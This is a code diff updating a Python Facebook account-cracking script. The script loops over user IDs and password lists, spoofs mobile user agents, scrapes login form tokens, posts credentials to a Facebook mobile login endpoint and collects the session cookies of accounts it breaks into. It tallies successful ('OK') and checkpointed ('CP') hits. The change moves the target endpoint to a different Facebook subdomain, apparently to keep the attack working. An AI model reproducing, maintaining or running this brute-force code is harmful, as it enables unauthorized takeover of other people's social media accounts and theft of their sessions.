@@ -148,7 +148,7 @@ def fuck():
         IP = requests.get('https://api.ipify.org').text
         print('┏━[•] Total IDs: \033[1;37m'+tl)
         print('\x1b[1;92m┣━[•] Your Code: \033[1;37m'+code)
-        print('\x1b[1;92m┣━[•] YOUR IP ADDRESS : \033[1;32m'+IP)
+        print('\x1b[1;92m┣━[•] YOUR IP ADDRESS: \033[1;37m'+IP)
         print('\x1b[1;92m┣━[•] Process has been started')
         print('┗━[•] Dont Use Airplane mode')
         print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
@@ -170,9 +170,9 @@ def DEVHIS2(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r\033[1;92m[FINDING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m] [OK-%s] ~ [CP-%s]'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write(f'\r\033[1;92m[FINDING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m] [OK-%s] ~ [CP-%s] '%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://mbasic.alpha.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -183,7 +183,7 @@ def DEVHIS2(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
+            header_freefb = {'authority': 'mbasic.alpha.facebook.com',
     'method': 'GET',
     'scheme': 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -201,7 +201,7 @@ def DEVHIS2(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700H Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',}
-            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
